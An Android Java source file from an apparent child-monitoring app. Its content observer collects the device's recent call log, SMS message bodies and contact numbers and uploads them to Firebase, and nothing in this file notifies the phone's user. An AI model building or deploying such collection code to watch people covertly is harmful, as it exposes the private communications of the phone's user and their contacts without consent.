package com.childmonitorai;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.os.Handler;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;

public class DataContentObserver extends ContentObserver {
    private FirebaseHelper firebaseHelper;
    private Context context;

    // Constructor where Context is passed to get ContentResolver
    public DataContentObserver(Handler handler, FirebaseHelper firebaseHelper, Context context) {
        super(handler);
        this.firebaseHelper = firebaseHelper;
        this.context = context;
    }

    @Override
    public void onChange(boolean selfChange) {
        super.onChange(selfChange);
        // Monitor Call Logs
        monitorCalls();
        // Monitor SMS
        monitorSms();
        // Monitor Contacts
        monitorContacts();
    }

    private void monitorCalls() {
        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 10");

        if (cursor != null) {
            try {
                while (cursor.moveToNext()) {
                    int numberColumnIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                    int durationColumnIndex = cursor.getColumnIndex(CallLog.Calls.DURATION);
                    int typeColumnIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
                    int timestampColumnIndex = cursor.getColumnIndex(CallLog.Calls.DATE);

                    // Check if column indices are valid
                    if (numberColumnIndex >= 0 && durationColumnIndex >= 0 && typeColumnIndex >= 0 && timestampColumnIndex >= 0) {
                        String number = cursor.getString(numberColumnIndex);
                        String duration = cursor.getString(durationColumnIndex);
                        String type = cursor.getString(typeColumnIndex);
                        String timestamp = cursor.getString(timestampColumnIndex);

                        // Push the data to Firebase
                        firebaseHelper.getCallsReference().push().setValue(new CallData(number, duration, type, timestamp));
                    }
                }
            } catch (Exception e) {
                Log.e("DataContentObserver", "Error monitoring calls", e);
            } finally {
                cursor.close();
            }
        }
    }

    private void monitorSms() {
        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DATE + " DESC LIMIT 10");

        if (cursor != null) {
            try {
                while (cursor.moveToNext()) {
                    int addressColumnIndex = cursor.getColumnIndex(Telephony.Sms.ADDRESS);
                    int bodyColumnIndex = cursor.getColumnIndex(Telephony.Sms.BODY);
                    int typeColumnIndex = cursor.getColumnIndex(Telephony.Sms.TYPE);
                    int timestampColumnIndex = cursor.getColumnIndex(Telephony.Sms.DATE);

                    // Check if column indices are valid
                    if (addressColumnIndex >= 0 && bodyColumnIndex >= 0 && typeColumnIndex >= 0 && timestampColumnIndex >= 0) {
                        String address = cursor.getString(addressColumnIndex);
                        String body = cursor.getString(bodyColumnIndex);
                        String type = cursor.getString(typeColumnIndex);
                        String timestamp = cursor.getString(timestampColumnIndex);

                        // Push the SMS data to Firebase
                        firebaseHelper.getSmsReference().push().setValue(new SmsData(address, body, type, timestamp));
                    }
                }
            } catch (Exception e) {
                Log.e("DataContentObserver", "Error monitoring SMS", e);
            } finally {
                cursor.close();
            }
        }
    }

    private void monitorContacts() {
        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, ContactsContract.Contacts.DISPLAY_NAME + " ASC LIMIT 10");

        if (cursor != null) {
            try {
                while (cursor.moveToNext()) {
                    int nameColumnIndex = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
                    int hasPhoneNumberColumnIndex = cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER);

                    // Check if column indices are valid
                    if (nameColumnIndex >= 0 && hasPhoneNumberColumnIndex >= 0) {
                        String name = cursor.getString(nameColumnIndex);
                        String hasPhoneNumber = cursor.getString(hasPhoneNumberColumnIndex);

                        // Check if contact has a phone number
                        if ("1".equals(hasPhoneNumber)) {
                            // Query the contact's phone number
                            Cursor phoneCursor = contentResolver.query(
                                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                    null,
                                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                    new String[]{cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID))},
                                    null);

                            if (phoneCursor != null) {
                                while (phoneCursor.moveToNext()) {
                                    String contactNumber = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                                    // Push contact data to Firebase
                                    firebaseHelper.getContactsReference().push().setValue(new ContactData(name, contactNumber));
                                }
                                phoneCursor.close();
                            }
                        }
                    }
                }
            } catch (Exception e) {
                Log.e("DataContentObserver", "Error monitoring contacts", e);
            } finally {
                cursor.close();
            }
        }
    }
}
